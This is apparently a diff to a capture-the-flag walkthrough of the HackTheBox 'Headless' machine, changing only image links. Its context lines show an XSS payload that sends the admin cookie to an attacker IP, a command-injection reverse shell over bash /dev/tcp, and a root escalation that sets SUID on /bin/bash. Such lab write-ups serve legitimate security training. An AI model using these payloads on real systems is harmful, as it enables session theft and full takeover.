@@ -38,7 +38,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.10.11.8
 ```
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/ping.png]]
+![](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -58,7 +58,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.8 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/allports.png]]
+![](screenshots/allports.png)
 
 Extract open ports:
 
@@ -66,7 +66,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/extractports.png]]
+![](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -87,7 +87,7 @@ Let's check the result:
 cat targeted
 ```
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/targeted.png]]
+![](screenshots/targeted.png)
 
 **Findings:**
 
@@ -105,15 +105,15 @@ Identify web technologies:
 whatweb http://10.10.11.8:5000
 ```
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/whatweb.png]]
+![](screenshots/whatweb.png)
 
 Accessing the site shows a landing page:
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/web.png]]
+![](screenshots/web.png)
 
 The only available option is the **For Questions** button, which redirects us... to a support form:
 
-![[web_support.png]]
+![](screenshots/web_support.png)
 
 When filling it in and tap in *submit*, the page refreshes and clears the fields.  
 We are in `/support`, so we proceed with **directory brute forcing**:
@@ -122,12 +122,12 @@ We are in `/support`, so we proceed with **directory brute forcing**:
 gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ```
 
-![[gobuster.png]]
+![](screenshots/gobuster.png)
 
 We discover `/support` and `/dashboard`.  
 However, `/dashboard` returns **401 Unauthorized**:
 
-![[dashboard_unauthorised.png]]
+![](screenshots/dashboard_unauthorised.png)
 
 The `whatweb` results also revealed the cookie `is_admin`, suggesting privilege-based access.  
 
@@ -138,21 +138,21 @@ The `whatweb` results also revealed the cookie `is_admin`, suggesting privilege-
 
 Intercepting the support form request with BurpSuite:
 
-![[bs_dashboard.png]]
+![](screenshots/bs_dashboard.png)
 
 Nothing interesting. Let´s see if there are XSS vulnerabilities filling the form like:
 
-![[support_xss.png]]
+![](screenshots/support_xss.png)
 
 After tap on **submit**:
 
-![[support_hacking_attempt.png]]
+![](screenshots/support_hacking_attempt.png)
 
 Seems that our info has been sent to support team to analyze the hacking attempt detected. Probably, if we intercept this request, we can see where this info is going and steal the receiver’s session cookie.
 
 Intercepting the request:
 
-![[bs_support_original.png]]  
+![](screenshots/bs_support_original.png)
 
 Let's test for **XSS injection** by modifying the **User-Agent** with payload:
 
@@ -160,11 +160,11 @@ Let's test for **XSS injection** by modifying the **User-Agent** with payload:
 <script>alert(0);</script>
 ```
 
-![[bs_support_script.png]]
+![](screenshots/bs_support_script.png)
 
 The alert executes successfully:
 
-![[xss_vulnerability_detected.png]]
+![](screenshots/xss_vulnerability_detected.png)
 
 Thus, the application is vulnerable to **XSS**.
 
@@ -177,11 +177,11 @@ We can steal the admin’s session cookie with the following payload:
 <script>var i=new Image(); i.src="http://10.10.14.7/?cookie=" + document.cookie</script>
 ```
 
-![[bs_sending_cookie.png]]
+![](screenshots/bs_sending_cookie.png)
 
 Start a Python server and wait for incoming requests:
 
-![[cookies_receive.png]]
+![](screenshots/cookies_receive.png)
 
 We receive two cookies:
 - Our own session
@@ -194,7 +194,7 @@ ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
 
 We replace our cookie in the browser with the admin’s:
 
-![[admin_dashboard.png]]
+![](screenshots/admin_dashboard.png)
 
 We now have access to the Dashboard.
 
@@ -203,8 +203,8 @@ We now have access to the Dashboard.
 
 On the dashboard, selecting *Generate Report* sends a request with a `date` parameter:
 
-![[admin_dashboard_generate_report.png]]  
-![[bs_generate_report_original.png]]
+![](screenshots/admin_dashboard_generate_report.png)
+![](screenshots/bs_generate_report_original.png)
 
 Open a Netcat listener:
 
@@ -218,15 +218,15 @@ Inject a reverse shell in the `date` parameter:
 date=2023-09-15; bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"
 ```
 
-![[bs_generate_report_edit_date.png]]
+![](screenshots/bs_generate_report_edit_date.png)
 
 As requests are URL encoded, we must encode the payload:
 
-![[bs_generate_report_encode_date.png]]
+![](screenshots/bs_generate_report_encode_date.png)
 
 This time, the reverse shell connects:
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/user_flag.png]]
+![](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -241,7 +241,7 @@ List sudo privileges:
 sudo -l
 ```
 
-![[dvir_files_to_execute.png]]
+![](screenshots/dvir_files_to_execute.png)
 
 We can run `/usr/bin/syscheck` as root without a password.
 
@@ -253,7 +253,7 @@ View its content:
 cat /usr/bin/syscheck
 ```
 
-![[file_to_execute.png]]
+![](screenshots/file_to_execute.png)
 
 Running as sudo:
 
@@ -261,7 +261,7 @@ Running as sudo:
 sudo /usr/bin/syscheck
 ```
 
-![[executing_file.png]]
+![](screenshots/executing_file.png)
 
 At the end, it executes `initdb.sh` if not already running.  
 
@@ -275,7 +275,7 @@ Check current bash permissions:
 ls -l /bin/bash
 ```
 
-![[bash_permissions_root_nok.png]]
+![](screenshots/bash_permissions_root_nok.png)
 
 Create a malicious script that sets the SUID bit on `/bin/bash`:
 
@@ -283,7 +283,7 @@ Create a malicious script that sets the SUID bit on `/bin/bash`:
 chmod u+s /bin/bash
 ```
 
-![[changing_permissions.png]]
+![](screenshots/changing_permissions.png)
 
 Run `syscheck` again:
 
@@ -292,11 +292,11 @@ sudo /usr/bin/syscheck
 ls -l /bin/bash
 ```
 
-![[bash_permissions_root_ok.png]]
+![](screenshots/bash_permissions_root_ok.png)
 
 Now `/bin/bash` has the SUID bit set, allowing us to spawn a root shell:
 
-![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/root_flag.png]]
+![](screenshots/root_flag.png)
 
 ✅ **Root flag obtained**
 
